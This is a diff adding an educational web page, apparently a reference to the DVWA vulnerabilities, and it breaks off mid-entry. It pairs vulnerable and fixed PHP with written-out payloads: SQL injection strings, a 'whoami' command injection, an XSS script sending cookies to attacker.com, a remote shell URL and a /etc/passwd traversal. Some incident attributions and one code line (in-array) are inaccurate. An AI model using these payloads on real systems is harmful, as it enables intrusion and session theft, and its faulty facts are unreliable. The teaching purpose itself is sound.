@@ -1,0 +1,2029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DVWA Attack Explorer - Educational Cyber Reference</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <!-- Lucide Icons CDN -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            cyber: {
+              bg: '#080b11',
+              'bg-darker': '#030508',
+              card: '#0f1420',
+              'card-hover': '#161c2d',
+              green: '#10b981',
+              blue: '#00f2fe',
+              red: '#ff2a5f',
+              orange: '#ff9f00',
+              border: '#1e2638',
+              'border-glow': 'rgba(16, 185, 129, 0.15)',
+              'text-muted': '#8896af',
+              'text-bright': '#f1f5f9'
+            }
+          },
+          fontFamily: {
+            mono: ['"JetBrains Mono"', 'monospace'],
+            sans: ['Inter', 'sans-serif']
+          }
+        }
+      }
+    }
+  </script>
+
+  <style type="text/css">
+    /* Custom scanlines, grids, and premium shadows */
+    body {
+      background-color: #080b11;
+      color: #8896af;
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+    }
+    .cyber-grid-overlay {
+      background-size: 55px 55px;
+      background-image: 
+        linear-gradient(to right, rgba(16, 185, 129, 0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(16, 185, 129, 0.02) 1px, transparent 1px);
+    }
+    .cyber-scanline {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 10px;
+      background: linear-gradient(to bottom, rgba(16, 185, 129, 0), rgba(16, 185, 129, 0.005) 50%, rgba(16, 185, 129, 0));
+      z-index: 9999;
+      pointer-events: none;
+      animation: scanline 15s linear infinite;
+    }
+    @keyframes scanline {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(100%); }
+    }
+    .text-glow-green {
+      text-shadow: 0 0 10px rgba(16, 185, 129, 0.6);
+    }
+    .text-glow-blue {
+      text-shadow: 0 0 10px rgba(0, 242, 254, 0.6);
+    }
+    .text-glow-red {
+      text-shadow: 0 0 10px rgba(255, 42, 95, 0.6);
+    }
+    .text-glow-orange {
+      text-shadow: 0 0 10px rgba(255, 159, 0, 0.6);
+    }
+    /* Hide scrollbar on chrome/safari */
+    .no-scrollbar::-webkit-scrollbar {
+      display: none;
+    }
+    .animate-terminal-cursor {
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+      from, to { background-color: transparent; }
+      50% { background-color: #10b981; }
+    }
+    .hover-float {
+      transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+    }
+    .hover-float:hover {
+      transform: translateY(-5px);
+      border-color: #10b981 !important;
+      box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.2);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between relative overflow-x-hidden">
+
+  <!-- Scanline & Background Layer -->
+  <div class="fixed inset-0 pointer-events-none z-0 overflow-hidden">
+    <div class="absolute inset-0 cyber-grid-overlay opacity-90"></div>
+    <div class="absolute inset-0 bg-[radial-gradient(ellipse_at_center,transparent_30%,#080b11_95%)]"></div>
+    <div class="absolute top-[-10%] left-[-10%] h-[500px] w-[500px] rounded-full bg-cyber-green/5 blur-[120px] pointer-events-none"></div>
+    <div class="absolute bottom-[-10%] right-[-10%] h-[500px] w-[500px] rounded-full bg-cyber-blue/5 blur-[140px] pointer-events-none"></div>
+    <canvas id="bg-canvas" class="absolute inset-0 opacity-70"></canvas>
+    <div class="cyber-scanline"></div>
+  </div>
+
+  <!-- Header / Navigation Bar -->
+  <nav class="sticky top-0 z-50 w-full border-b border-cyber-border bg-cyber-bg/85 backdrop-blur-md">
+    <div class="relative mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+      <div class="relative flex h-16 items-center justify-between">
+        
+        <!-- Logo -->
+        <div class="flex items-center">
+          <a href="#/" class="flex items-center gap-2 font-mono text-lg font-bold tracking-tight text-cyber-text-bright transition hover:opacity-95">
+            <i data-lucide="shield" class="h-6 w-6 text-cyber-green text-glow-green animate-pulse"></i>
+            <span>
+              DVWA<span class="text-cyber-green">@</span>EXPLORER
+              <span class="ml-1 inline-block h-3.5 w-1.5 align-middle animate-terminal-cursor"></span>
+            </span>
+          </a>
+        </div>
+
+        <!-- Navigation Links (Centered) -->
+        <div class="hidden md:flex absolute left-1/2 -translate-x-1/2 items-center">
+          <div class="flex items-center gap-6 font-mono text-sm uppercase">
+            <a href="#/" id="nav-home" class="text-cyber-green border-b border-cyber-green/50 pb-0.5 tracking-wider transition hover:text-cyber-green">Home</a>
+            <a href="#/glossary" id="nav-glossary" class="text-cyber-text-muted tracking-wider transition hover:text-cyber-green">Glossary</a>
+            <a href="#/quiz" id="nav-quiz" class="text-cyber-text-muted tracking-wider transition hover:text-cyber-green">Quiz</a>
+          </div>
+        </div>
+
+        <!-- Right Widgets -->
+        <div class="flex items-center gap-4">
+          <div class="flex items-center gap-2 rounded-full border border-cyber-border bg-cyber-bg-darker px-3 py-1 text-xs font-mono">
+            <i data-lucide="award" class="h-4 w-4 text-cyber-orange"></i>
+            <span class="text-cyber-text-bright" id="explored-counter">0/18</span>
+            <span class="text-cyber-text-muted hidden sm:inline">Explored</span>
+          </div>
+
+          <button id="sound-btn" class="rounded-lg border border-cyber-border bg-cyber-bg-darker p-2 text-cyber-text-muted transition hover:border-cyber-green hover:text-cyber-green" title="Toggle Clicks Sound">
+            <i data-lucide="volume-2" class="h-4 w-4"></i>
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </nav>
+
+  <!-- Mobile Navigation Menu -->
+  <div class="flex justify-center gap-6 py-2.5 border-b border-cyber-border/40 md:hidden font-mono text-xs bg-cyber-bg-darker/60 relative z-20">
+    <a href="#/" id="mob-home" class="text-cyber-green font-bold">[HOME]</a>
+    <a href="#/glossary" id="mob-glossary" class="text-cyber-text-muted">[GLOSSARY]</a>
+    <a href="#/quiz" id="mob-quiz" class="text-cyber-text-muted">[QUIZ]</a>
+  </div>
+
+  <!-- Main Content Wrapper -->
+  <main class="relative z-10 flex-grow w-full">
+    <div id="router-view" class="w-full">
+      <!-- Pages will render dynamically here -->
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="relative z-10 w-full border-t border-cyber-border/40 py-6 text-center font-mono text-[10px] text-cyber-text-muted">
+    <div class="mx-auto max-w-7xl px-4">
+      <p>// DVWA_ATTACK_EXPLORER v1.0.0 - PORTABLE CYBERSECURITY ARCHIVE</p>
+      <p class="mt-1.5 text-cyber-orange/60 font-semibold">
+        CRITICAL WARNING: This portal is strictly educational. Contains zero executable scripts.
+      </p>
+    </div>
+  </footer>
+
+  <!-- Web Audio click sound helper -->
+  <script>
+    let soundEnabled = true;
+    const playClickSound = () => {
+      if (!soundEnabled) return;
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(150, audioCtx.currentTime + 0.08);
+        gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.08);
+      } catch(e) {}
+    };
+
+    document.getElementById('sound-btn').addEventListener('click', () => {
+      soundEnabled = !soundEnabled;
+      const btn = document.getElementById('sound-btn');
+      btn.innerHTML = soundEnabled ? '<i data-lucide="volume-2" class="h-4 w-4"></i>' : '<i data-lucide="volume-x" class="h-4 w-4"></i>';
+      lucide.createIcons();
+    });
+
+    document.addEventListener('click', (e) => {
+      if (e.target.closest('a') || e.target.closest('button')) {
+        playClickSound();
+      }
+    });
+  </script>
+
+  <!-- Canvas Particles Background Script -->
+  <script>
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+    const particleCount = 35;
+
+    const resize = () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    };
+    window.addEventListener('resize', resize);
+    resize();
+
+    class Particle {
+      constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.vx = (Math.random() - 0.5) * 0.3;
+        this.vy = (Math.random() - 0.5) * 0.3;
+        this.size = Math.random() * 2 + 1;
+      }
+      update() {
+        this.x += this.vx;
+        this.y += this.vy;
+        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+      }
+      draw() {
+        ctx.fillStyle = 'rgba(16, 185, 129, 0.2)';
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+
+    for (let i = 0; i < particleCount; i++) particles.push(new Particle());
+
+    const animate = () => {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.strokeStyle = 'rgba(0, 242, 254, 0.04)';
+      ctx.lineWidth = 0.8;
+      
+      particles.forEach(p => {
+        p.update();
+        p.draw();
+      });
+
+      for (let i = 0; i < particles.length; i++) {
+        for (let j = i + 1; j < particles.length; j++) {
+          const dx = particles[i].x - particles[j].x;
+          const dy = particles[i].y - particles[j].y;
+          const dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < 120) {
+            ctx.beginPath();
+            ctx.moveTo(particles[i].x, particles[i].y);
+            ctx.lineTo(particles[j].x, particles[j].y);
+            ctx.stroke();
+          }
+        }
+      }
+      requestAnimationFrame(animate);
+    };
+    animate();
+  </script>
+
+  <!-- Core Threat Data Database -->
+  <script>
+    const attacks = [
+      {
+        id: 'sql-injection',
+        name: 'SQL Injection (SQLi)',
+        severity: 'Critical',
+        icon: 'database',
+        description: 'Vulnerability where raw input strings are concatenated directly into SQL command strings, altering query logic.',
+        overview: 'SQL Injection occurs when user-supplied input is directly used to construct dynamic SQL queries without validation or parameter binding. An attacker can inject query commands (like OR 1=1) to force databases to return unauthorized records, bypass logins, or alter sensitive databases.',
+        realWorldImpact: 'Attackers can bypass login screens, steal passwords, download customer databases, or drop tables entirely, leading to massive data breaches and compliance failures.',
+        codeLang: 'PHP',
+        codeVuln: '$id = $_GET[\'id\'];\n$query = "SELECT * FROM users WHERE id = \'$id\'";\n$result = mysqli_query($db, $query);',
+        codeSecure: '$id = $_GET[\'id\'];\n$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->bind_param("s", $id);\n$stmt->execute();',
+        rootCause: 'Lack of input parameter isolation from executable SQL code tokens.',
+        prevention: [
+          'Use Prepared Statements (Parameterized Queries) consistently.',
+          'Adopt standard Object Relational Mappers (ORMs) which bind values safely by default.',
+          'Apply the Principle of Least Privilege to database connection handles.',
+          'Employ database input whitelist filters.'
+        ],
+        howItWorks: [
+          'User inputs: admin\' OR \'1\'=\'1',
+          'Application merges input: SELECT * FROM users WHERE user=\'admin\' OR \'1\'=\'1\'',
+          'Database evaluates OR \'1\'=\'1\' as always TRUE',
+          'Database returns first row (Administrator account) bypassing login'
+        ],
+        relatedAttacks: ['blind-sql-injection', 'broken-access-control', 'weak-session'],
+        incidents: [
+          { title: 'Equifax Data Leak', year: 2017, description: 'Exposed records of 147 million users due to unpatched database interfaces.' },
+          { title: 'Heartland Payment Systems', year: 2008, description: 'Over 130 million credit card records compromised using SQL Injection vectors.' }
+        ]
+      },
+      {
+        id: 'blind-sql-injection',
+        name: 'Blind SQL Injection',
+        severity: 'High',
+        icon: 'eye-off',
+        description: 'Injection where database errors or contents are not returned to the user, forcing the attacker to guess via true/false checks.',
+        overview: 'Blind SQL Injection occurs when a web interface is vulnerable but does not print any database query output or errors. An attacker must ask the database boolean true/false questions or inject time-delay commands (like sleep(5)) to determine if injected statements evaluate as true, reading tables character-by-character.',
+        realWorldImpact: 'Allows total data exfiltration just like standard SQLi, only slower. Attackers can write scripts to systematically dump the database by monitoring server latency.',
+        codeLang: 'PHP',
+        codeVuln: '$id = $_GET[\'id\'];\n$query = "SELECT * FROM users WHERE id = \'$id\'";\n$result = mysqli_query($db, $query);\n// Only returns "User Exists" or "Not Found"\nif (mysqli_num_rows($result) > 0) { echo "User Exists"; }',
+        codeSecure: '$id = $_GET[\'id\'];\n$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->bind_param("i", $id);\n$stmt->execute();\n$result = $stmt->get_result();',
+        rootCause: 'Dynamic query concatenation that alters query execution times or outputs.',
+        prevention: [
+          'Always parameterize queries using bound variables.',
+          'Disable verbose database debugging logs on public pages.',
+          'Implement Rate Limiting to block rapid serial latency tests.'
+        ],
+        howItWorks: [
+          'Attacker sends request adding delay: admin\' AND SLEEP(5) --',
+          'Server takes 5+ seconds to return response',
+          'Attacker infers the injected statement evaluated as TRUE',
+          'Attacker exfiltrates password hashes letter by letter using true/false guesses'
+        ],
+        relatedAttacks: ['sql-injection', 'broken-access-control'],
+        incidents: [
+          { title: 'TalkTalk Hack', year: 2015, description: 'Attacker exfiltrated bank details of 150,000 customers using Blind SQL Injection.' }
+        ]
+      },
+      {
+        id: 'command-injection',
+        name: 'Command Injection',
+        severity: 'Critical',
+        icon: 'terminal',
+        description: 'Vulnerability where shell commands are concatenated with unsanitized parameters, executing arbitrary shell code on the host OS.',
+        overview: 'Command Injection is a critical vulnerability that occurs when a web application passes unsanitized user inputs directly to a system shell command (like exec(), system(), or shell_exec()). An attacker can inject command separators (like ;, &&, or |) to execute malicious operating system instructions.',
+        realWorldImpact: 'Total server takeover. An attacker can run commands as the web daemon, retrieve configuration credentials, download ransomware, or pivot into the internal network.',
+        codeLang: 'PHP',
+        codeVuln: '$target = $_GET[\'ip\'];\n$cmd = shell_exec("ping -c 3 " . $target);\necho "<pre>{$cmd}</pre>";',
+        codeSecure: '$target = $_GET[\'ip\'];\n// Validate strict IPv4 format before execution\nif (filter_var($target, FILTER_VALIDATE_IP)) {\n  $cmd = shell_exec("ping -c 3 " . escapeshellarg($target));\n  echo "<pre>{$cmd}</pre>";\n}',
+        rootCause: 'Passing unsanitized parameters directly into host system command shell interpreters.',
+        prevention: [
+          'Avoid executing operating system commands directly from application code.',
+          'Use built-in framework API methods instead of shell commands.',
+          'Sanitize and escape command arguments using methods like escapeshellarg() if shells must be invoked.'
+        ],
+        howItWorks: [
+          'User inputs: 8.8.8.8; whoami',
+          'Application executes shell: ping -c 3 8.8.8.8; whoami',
+          'Server runs ping, then runs whoami command',
+          'Server prints "root" or "www-data" context output to attacker browser'
+        ],
+        relatedAttacks: ['sql-injection', 'file-inclusion'],
+        incidents: [
+          { title: 'Equifax Breach', year: 2017, description: 'Apache Struts command injection bug allowed server shell file exfiltration.' }
+        ]
+      },
+      {
+        id: 'xss-reflected',
+        name: 'Reflected XSS (Cross-Site Scripting)',
+        severity: 'High',
+        icon: 'code',
+        description: 'Vulnerability where malicious script payloads in parameters are reflected back inside search pages immediately.',
+        overview: 'Reflected Cross-Site Scripting occurs when an application receives user input in an HTTP request and immediately reflects it back inside the browser DOM without escaping. An attacker crafts a link containing a script block; when a victim clicks the link, the script runs inside their browser session.',
+        realWorldImpact: 'Attackers can steal session cookies, hijack active logins, redirect users to phishing portals, or capture keystrokes using inline listeners.',
+        codeLang: 'PHP',
+        codeVuln: '$name = $_GET[\'name\'];\necho "<h1>Hello, " . $name . "</h1>";',
+        codeSecure: '$name = $_GET[\'name\'];\necho "<h1>Hello, " . htmlspecialchars($name, ENT_QUOTES, \'UTF-8\') . "</h1>";',
+        rootCause: 'Immediate rendering of HTTP parameters into HTML output without sanitization.',
+        prevention: [
+          'Context-aware HTML escaping of all user variables.',
+          'Define robust Content Security Policies (CSP) blocking inline script tags.',
+          'Set HttpOnly flags on cookies to block access from document.cookie scripts.'
+        ],
+        howItWorks: [
+          'Attacker sends phishing link: ?name=<script>alert("Hacked")<\/script>',
+          'Victim clicks link and browser requests page',
+          'Server reflects parameters raw: <h1>Hello, <script>alert("Hacked")<\/script></h1>',
+          'Victim browser executes script block automatically'
+        ],
+        relatedAttacks: ['xss-stored', 'xss-dom', 'csrf'],
+        incidents: [
+          { title: 'Yahoo Mail XSS', year: 2015, description: 'A reflected XSS bug allowed attackers to access user mailboxes via a link.' }
+        ]
+      },
+      {
+        id: 'xss-stored',
+        name: 'Stored XSS (Persistent XSS)',
+        severity: 'High',
+        icon: 'save',
+        description: 'Vulnerability where malicious scripts are saved into databases, loading on all future visitor views.',
+        overview: 'Stored XSS is a persistent form of Cross-Site Scripting that occurs when an application saves unsanitized inputs into a database (such as comments, profiles, or posts). Whenever a user visits that page, the database serves the malicious script, executing it in their browsers automatically.',
+        realWorldImpact: 'Widespread account hijacking. Every single user who views the compromised comment page will have the payload run in their browser, potentially stealing thousands of active sessions.',
+        codeLang: 'PHP',
+        codeVuln: '$comment = $_POST[\'text\'];\n// Store raw comment to database\n$db->query("INSERT INTO comments (text) VALUES (\'$comment\')");',
+        codeSecure: '$comment = $_POST[\'text\'];\n// Escape before HTML print, or sanitize database store inputs\n$clean = htmlspecialchars($comment, ENT_QUOTES, \'UTF-8\');\n$stmt = $db->prepare("INSERT INTO comments (text) VALUES (?)");\n$stmt->bind_param("s", $clean);',
+        rootCause: 'Storing unsanitized inputs into persistent databases and displaying them raw.',
+        prevention: [
+          'Escape inputs contextually prior to rendering in HTML views.',
+          'Implement a strict Content Security Policy (CSP) blocking unsafe inline scripts.',
+          'Sanitize input using robust libraries like DOMPurify.'
+        ],
+        howItWorks: [
+          'Attacker saves comment: <script>fetch("attacker.com?cookie=" + document.cookie)<\/script>',
+          'Database stores script block persistently',
+          'Normal visitor loads comment section page',
+          'Visitor browser loads comment and executes script, sending their session cookie to attacker'
+        ],
+        relatedAttacks: ['xss-reflected', 'xss-dom', 'csrf'],
+        incidents: [
+          { title: 'Samy Worm (MySpace)', year: 2005, description: 'Stored XSS script auto-replicated to profile pages, infecting 1 million accounts in 20 hours.' }
+        ]
+      },
+      {
+        id: 'xss-dom',
+        name: 'DOM-based XSS',
+        severity: 'High',
+        icon: 'layout',
+        description: 'Client-side script execution where Javascript reads inputs directly from browser properties and writes them into raw innerHTML sinks.',
+        overview: 'DOM-based XSS is a client-side vulnerability where the server is not involved. JavaScript code inside the browser reads data from a dynamic source (like location.hash or location.search) and passes it directly to an execution sink (like innerHTML, eval(), or document.write()) without sanitization.',
+        realWorldImpact: 'Similar to reflected XSS, attackers can execute arbitrary Javascript code to steal sessions, capture keystrokes, or display fake forms.',
+        codeLang: 'JavaScript',
+        codeVuln: 'const query = new URLSearchParams(window.location.search);\nconst name = query.get("name");\n// Vulnerable DOM sink write\ndocument.getElementById("greeting").innerHTML = "Hello " + name;',
+        codeSecure: 'const query = new URLSearchParams(window.location.search);\nconst name = query.get("name");\n// Secure write using textContent (treats as text, not script HTML)\ndocument.getElementById("greeting").textContent = "Hello " + name;',
+        rootCause: 'Passing dynamic, user-controlled properties directly into unsafe JavaScript innerHTML/eval sinks.',
+        prevention: [
+          'Avoid passing user data to unsafe sinks like innerHTML or document.write.',
+          'Use safe element modifiers like textContent or innerText.',
+          'Perform client-side validation using DOMPurify before rendering dynamic HTML nodes.'
+        ],
+        howItWorks: [
+          'Attacker sends URL: page.html#name=<img src=x onerror=alert(1)>',
+          'Client JavaScript reads location.hash parameter',
+          'JavaScript writes raw hash string straight into container innerHTML sink',
+          'Browser loads fake image path, triggering onerror alert event inline'
+        ],
+        relatedAttacks: ['xss-reflected', 'xss-stored'],
+        incidents: [
+          { title: 'Google Docs DOM Bug', year: 2018, description: 'Allowed attackers to hijack user sessions via document preview DOM link manipulations.' }
+        ]
+      },
+      {
+        id: 'csrf',
+        name: 'CSRF (Cross-Site Request Forgery)',
+        severity: 'Medium',
+        icon: 'shuffle',
+        description: 'Vulnerability where an attacker website triggers unauthorized state-changing actions inside a user\'s session browser tab.',
+        overview: 'CSRF is an attack that forces an end-user to execute unwanted actions on a web application in which they\'re currently authenticated. Because browsers automatically attach cookies to request domains, an external attacker site can submit state-changing POST requests (like transfer funds) on the victim\'s behalf.',
+        realWorldImpact: 'Attackers can change account passwords, transfer money, change shipping addresses, or perform administrative tasks without the user\'s knowledge.',
+        codeLang: 'HTML/PHP',
+        codeVuln: '<!-- Attacker Page loaded in a separate browser tab -->\n<form action="https://bank.com/transfer" method="POST" id="csrfForm">\n  <input type="hidden" name="to" value="attacker" />\n  <input type="hidden" name="amount" value="5000" />\n</form>\n<script>document.getElementById("csrfForm").submit();<\/script>',
+        codeSecure: '<!-- Secured Backend validating Anti-CSRF token parameters -->\nif ($_POST[\'token\'] !== $_SESSION[\'csrf_token\']) {\n  die("Unauthorized request token! CSRF check failed.");\n}',
+        rootCause: 'Web browsers automatically attaching active session identifier cookies to all outgoing domain requests.',
+        prevention: [
+          'Generate and validate cryptographic Anti-CSRF Tokens for all state-altering requests.',
+          'Set SameSite=Strict or SameSite=Lax flags on session cookies.',
+          'Require password verification before executing critical account edits (like password resets).'
+        ],
+        howItWorks: [
+          'Victim logs into bank.com and keeps session open',
+          'Victim visits attacker-owned page in a separate tab',
+          'Attacker page triggers auto-submit form to bank.com/transfer',
+          'Victim browser sends request, attaching session cookies automatically, executing the transfer'
+        ],
+        relatedAttacks: ['xss-reflected', 'weak-session'],
+        incidents: [
+          { title: 'Netflix CSRF Bug', year: 2006, description: 'Allowed attackers to add movies to queues or change user addresses via malicious forms.' }
+        ]
+      },
+      {
+        id: 'file-inclusion',
+        name: 'File Inclusion (LFI / RFI)',
+        severity: 'High',
+        icon: 'folder-open',
+        description: 'Vulnerability where inputs control dynamic file path inclusion, loading internal server files (LFI) or external URLs (RFI).',
+        overview: 'File Inclusion vulnerabilities occur when user-controlled parameter values dictate file paths in PHP include statements. Local File Inclusion (LFI) lets attackers read server files (like /etc/passwd), while Remote File Inclusion (RFI) lets them load external URL script files onto the server.',
+        realWorldImpact: 'Information leakage or Remote Code Execution (RCE). An attacker can view configuration files, locate passwords, or load remote php shells, taking complete command of the host system.',
+        codeLang: 'PHP',
+        codeVuln: '$page = $_GET[\'page\'];\n// Loads any path parameter directly\ninclude($page);',
+        codeSecure: '$page = $_GET[\'page\'];\n// Strict Whitelist validation of accepted files\n$allowed = [\'home.php\', \'about.php\', \'contact.php\'];\nif (in-array($page, $allowed)) {\n  include($page);\n} else {\n  die("Invalid page parameter!");\n}',
+        rootCause: 'Dynamic inclusion of filesystem paths based on user parameters without strict validation.',
+        prevention: [
+          'Use a strict whitelist of accepted pages or template paths.',
+          'Disable remote file inclusion settings (allow_url_include = Off in php.ini).',
+          'Sanitize input path traversals (blocking ../ characters).'
+        ],
+        howItWorks: [
+          'User inputs LFI: ../../../../etc/passwd',
+          'Application loads relative path: include("../../../../etc/passwd")',
+          'Server prints system password file database raw on screen',
+          'User inputs RFI: http://attacker.com/shell.php to run remote backdoors'
+        ],
+        relatedAttacks: ['command-injection', 'file-upload'],
+        incidents: [
+          { title: 'Panama Papers Leak', year: 2016, description: 'WordPress plugin Local File Inclusion (LFI) vulnerability allowed internal file access.' }
+        ]
+      },
+      {
+        id: 'file-upload',
+        name: 'File Upload Vulnerabilities',
+        severity: 'High',
+        icon: 'upload',
+        description: 'Vulnerability where executable script files (like .php) are uploaded directly to public paths, allowing RCE.',
+        overview: 'File Upload vulnerabilities occur when a web application accepts user files (like profile photos) without validating the file extension, MIME type, or content. An attacker can upload a malicious script file (like backdoor.php) and execute it by requesting its public path in their browser.',
+        realWorldImpact: 'Remote Code Execution (RCE) on the server. Attackers can upload backdoors, read internal config files, access local databases, or deface the public site.',
+        codeLang: 'PHP',
+        codeVuln: '$target = "uploads/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);',
+        codeSecure: '$name = $_FILES["file"]["name"];\n$ext = pathinfo($name, PATHINFO_EXTENSION);\n$allowed = [\'jpg\', \'jpeg\', \'png\'];\n// Validate strict extension whitelist\nif (in_array(strtolower($ext), $allowed)) {\n  $safeName = uniqid() . "." . $ext;\n  move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $safeName);\n}',
+        rootCause: 'Allowing users to upload files with executable extensions directly to web-accessible directories.',
+        prevention: [
+          'Implement a strict whitelist of allowed file extensions.',
+          'Store uploaded files in a directory located outside the web root (non-executable).',
+          'Randomly rename files on save to prevent guessing of backdoor paths.',
+          'Verify file signatures (magic bytes) to ensure file types match extensions.'
+        ],
+        howItWorks: [
+          'Attacker uploads web shell backdoor: shell.php',
+          'Application saves file to public folder: /uploads/shell.php',
+          'Attacker requests URL: domain.com/uploads/shell.php?cmd=whoami',
+          'Server executes PHP script and prints system user details'
+        ],
+        relatedAttacks: ['command-injection', 'file-inclusion'],
+        incidents: [
+          { title: 'Equifax Breach (Apache Struts)', year: 2017, description: 'Exploited arbitrary file upload bug to deploy multiple backdoors.' }
+        ]
+      },
+      {
+        id: 'insecure-captcha',
+        name: 'Insecure CAPTCHA',
+        severity: 'Medium',
+        icon: 'check-square',
+        description: 'Vulnerability where CAPTCHA verification checks are bypassed or only verified client-side, enabling bots.',
+        overview: 'Insecure CAPTCHA occurs when an application implements a verification widget but fails to perform backend validation checks. Attackers can bypass the CAPTCHA by sending form parameters directly to the endpoint, omitting the CAPTCHA check parameters, or altering the client-side success response code.',
+        realWorldImpact: 'Enables automated bots to spam forms, execute brute force logins, register thousands of fake accounts, or scrap public data.',
+        codeLang: 'PHP',
+        codeVuln: '// Vulnerable implementation: checks captcha only if parameter is set\nif (isset($_POST[\'recaptcha_response\'])) {\n  // Check captcha\n} else {\n  // Bypassed! Saves entry anyway\n  saveForm();\n}',
+        codeSecure: '// Secure implementation: enforce strict verification check from backend API\n$res = verifyCaptcha($_POST[\'g-recaptcha-response\']);\nif ($res && $res->success) {\n  saveForm();\n} else {\n  die("CAPTCHA check failed! Bot detected.");\n}',
+        rootCause: 'Failure to perform strict backend validation checks on CAPTCHA response parameters.',
+        prevention: [
+          'Enforce backend server-side checks for all CAPTCHA responses.',
+          'Use modern behavioral anti-bot frameworks like Cloudflare Turnstile.',
+          'Block submission processing immediately if token fields are empty.'
+        ],
+        howItWorks: [
+          'Attacker writes Python automation script',
+          'Script submits form directly, omitting the CAPTCHA response parameter',
+          'Vulnerable server accepts form parameters, skipping the check',
+          'Attacker successfully registers thousands of automated accounts'
+        ],
+        relatedAttacks: ['brute-force', 'weak-session'],
+        incidents: [
+          { title: 'Ticketmaster Spam', year: 2013, description: 'Bots bypassed weak CAPTCHAs to buy out event tickets in bulk.' }
+        ]
+      },
+      {
+        id: 'weak-session',
+        name: 'Weak Session Management',
+        severity: 'High',
+        icon: 'key',
+        description: 'Vulnerability where session IDs are predictable, exposed in URLs, or have long timeouts, allowing hijacking.',
+        overview: 'Weak Session Management occurs when session identifiers (cookies) are generated using guessable algorithms (like sequential counters), exposed publicly in URLs, or fail to terminate after user logout, allowing attackers to hijack active sessions.',
+        realWorldImpact: 'Account hijacking. Attackers can predict future session IDs, reuse expired cookies, or intercept exposed URLs to access administrative panels.',
+        codeLang: 'PHP',
+        codeVuln: '// Vulnerable sequential session ID generation\n$id = $_SESSION[\'count\']++;\nsetcookie("SESSIONID", $id);',
+        codeSecure: '// Secure session config utilizing cryptographically secure identifiers\nsession_start([\n  \'cookie_lifetime\' => 0,\n  \'cookie_secure\' => true,\n  \'cookie_httponly\' => true,\n  \'cookie_samesite\' => \'Lax\'\n]);',
+        rootCause: 'Using predictable or insecurely configured session tokens to track logins.',
+        prevention: [
+          'Use cryptographically secure, random session identifiers.',
+          'Configure session cookies with HttpOnly, Secure, and SameSite flags.',
+          'Destroy session tokens on the server immediately on logout.'
+        ],
+        howItWorks: [
+          'User logs in and receives sequential cookie: SESSIONID=1005',
+          'Attacker guesses next cookie value: SESSIONID=1006',
+          'Attacker sends request with guessed cookie to bypass login',
+          'Server accepts cookie and logs attacker into victim account'
+        ],
+        relatedAttacks: ['csrf', 'broken-access-control'],
+        incidents: [
+          { title: 'Sony PlayStation Network', year: 2011, description: 'Weak session tokens and token theft led to compromise of 77 million accounts.' }
+        ]
+      },
+      {
+        id: 'brute-force',
+        name: 'Brute Force / Weak Auth',
+        severity: 'High',
+        icon: 'lock',
+        description: 'Custom Visual: Padlock grid. Explains how lack of login rate-limiting permits unlimited automated password guesses.',
+        overview: 'Brute Force occurs when an application permits infinite login guesses without locking the account or delaying requests. An attacker runs automated dictionaries containing common passwords to guess user credentials.',
+        realWorldImpact: 'Account takeover. Attackers can compromise user passwords, access internal systems, or execute horizontal account escalations.',
+        codeLang: 'PHP/SQL',
+        codeVuln: '// Checks password with no rate limits or attempt counters\n$user = $_POST[\'user\'];\n$pass = $_POST[\'pass\'];\n$db->query("SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'");',
+        codeSecure: '// Enforce lockout delay after consecutive failures\n$attempts = getFailedAttempts($user);\nif ($attempts > 5) {\n  die("Account locked. Please try again in 15 minutes.");\n}',
+        rootCause: 'Absence of login attempt limits, rate delays, or password strength verification.',
+        prevention: [
+          'Implement account lockout thresholds (e.g., 5 failed attempts).',
+          'Enforce multi-factor authentication (MFA).',
+          'Apply IP-based rate limiting on sensitive login routes.'
+        ],
+        howItWorks: [
+          'Attacker configures dictionary with 10,000 common passwords',
+          'Script sends login requests continuously',
+          'Application checks keys with no delays',
+          'Script identifies matching credentials, gaining system access'
+        ],
